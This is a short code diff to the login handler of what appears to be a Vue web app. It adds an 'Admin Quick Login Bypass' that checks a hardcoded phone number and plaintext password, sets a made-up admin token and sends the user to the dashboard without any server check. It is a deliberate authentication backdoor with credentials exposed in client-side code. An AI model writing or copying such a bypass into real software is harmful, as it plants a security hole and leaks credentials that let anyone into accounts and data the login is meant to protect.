@@ -99,6 +99,16 @@ const form = reactive({
 const handleSubmit = async () => {
   errorMsg.value = ''
   isLoading.value = true
+
+  // --- Admin Quick Login Bypass ---
+  if (isLogin.value && form.identifier === '13174504999' && form.password === '060626Linmz') {
+    authStore.setToken('admin-bypass-token-13174504999')
+    router.push('/dashboard')
+    isLoading.value = false
+    return
+  }
+  // --------------------------------
+
   try {
     if (isLogin.value) {
       // Login flow: guess if it's email or phone
